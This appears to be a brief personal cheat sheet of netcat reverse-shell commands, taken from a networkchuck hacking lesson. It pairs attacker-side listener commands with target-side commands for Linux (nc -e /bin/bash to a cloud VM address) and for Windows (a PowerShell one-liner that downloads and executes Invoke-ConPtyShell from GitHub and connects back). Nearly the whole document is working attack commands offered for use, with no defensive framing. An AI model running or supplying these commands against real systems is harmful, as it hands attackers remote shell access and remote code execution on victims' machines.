# netcat xamples

## Reverce shell attack

_**source**
> [networkchuck](https://learn.networkchuck.com/courses/take/ad-free-youtube-videos/lessons/25882550-how-to-get-remote-access-to-your-hacking-targets-reverse-shells-with-netcat)

### Attack Linux

#### ATTACKING machine

`nc -lnvp 87 -s ip-address-of-your-cloud-vm`

#### TARGET machine

```
nc -e /bin/bash ip-address-of-your-cloud-vm
OR
nc ip-address-of-your-cloud-vm
```

### Attack Windows

#### ATTACKING machine

`stty raw -echo; (stty size; cat) | nc -lvnp 87`

#### TARGET machine

`IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ip-address-of-your-cloud-vm 87`
